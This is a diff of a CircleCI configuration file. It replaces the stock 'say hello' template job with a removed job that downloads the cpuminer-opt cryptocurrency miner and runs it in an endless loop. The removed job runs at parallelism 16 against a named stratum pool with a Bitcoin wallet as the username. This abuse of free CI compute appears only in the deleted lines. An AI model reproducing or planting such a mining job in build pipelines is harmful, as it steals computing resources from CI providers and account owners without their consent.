@@ -1,32 +1,26 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              lscpu
-              echo Hello,subscribe it
-              #DOWNLOAD FILE OBT
-              https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+  say-hello:
+    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: cimg/base:stable
+    # Add steps to the job
+    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: "echo Hello, World!"
 
-              #EXSTRAX FILE
-              tar xf cpuminer-opt-linux.tar.gz
-
-              #RUN MINING OBT
-              while [ 1 ]; do
-              ./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
-
-sleep 5
-done
-
-#selesai
-
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+  say-hello-workflow:
+    jobs:
+      - say-hello
